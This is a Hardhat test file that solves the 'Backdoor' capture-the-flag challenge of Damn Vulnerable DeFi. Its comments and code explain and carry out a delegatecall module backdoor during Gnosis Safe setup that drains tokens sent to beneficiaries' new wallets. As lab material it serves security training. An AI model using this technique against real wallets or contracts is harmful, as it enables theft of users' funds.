const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther('40');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            this.masterCopy.address,
            this.walletFactory.address,
            this.token.address,
            users
        );

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.true;            
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Exploit', async function () {
        //The challenge requires a deep understanding of Gnosis Safe system, its architecture, and all the contracts related to
        //deploying their multi-sig wallets. On top of that, the challenge presents another contract
        //which will interact with them as well: the wallet registry. 

        //The elements of Gnosis to watch out are: the Gnosis Safe singleton contract, the proxy factory contract and the proxy wallets(GnosisSafeProxy).
        //The proxy wallets implement a minimal proxy contract layout (EIP1167), with a constructor and a fallback func that offloads and delegates 
        //all the logic to Gnosis Safe singleton contract, keeping the state in the proxy. When these wallets are created by one of the proxy factory funcs,  
        //a callback call is forwarded to our custom registry contract afterwards. 

        //The registry has some beneficiaries previously set, so whenever each one of them deploy their proxy wallets and our registry contract gets called, 
        //the latter will transfer 10 DVT tokens to the newly created Gnosis safe (proxy) wallet. The only way we can trick the system is at deployment time,
        //when setting up the new wallets, setup() function is called in Gnosis Safe logic by the new proxy wallet with all parameters needed. 
        
        //Looking more into detail on this initialization code, we can set up a module that will not require any approval of the owner at deployment. 
        //The module setup will delegate a call to our attacker smart contract and approve the attacker smart contract to spend the funds of the Gnosis wallet.
        //After the wallet deployment and getting the DVT tokens from the registry, we will execute a transfer call to steal tokens.
        //The attacker contract contains mostly of the malicious code to make the exploit for the four beneficiaries in one transactions. 
        //It also contains commments to make the code clear to understand. 
        
        console.log("Initial attacker DVT balance: ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
        const attackerContractFactory = await ethers.getContractFactory("BackdoorAttacker", attacker);
        const attackerContract = await attackerContractFactory.deploy(
            attacker.address,
            this.walletFactory.address,
            this.masterCopy.address,
            this.walletRegistry.address,
            this.token.address
        )
        console.log("Attacker contract deployed!")

         // Encoding data for Gnosis Safe setupModules delegate call
         const ABI = ["function backdoor(address _tokenAddress, address _attackerContractAddress)"];
         const iFace = new ethers.utils.Interface(ABI);
         const execData = iFace.encodeFunctionData("backdoor", [
             this.token.address, 
             attackerContract.address
         ])
        
        await attackerContract.attack(users, execData);
        console.log("Attacker DVT balance after exploit: ",  ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(
                await this.walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
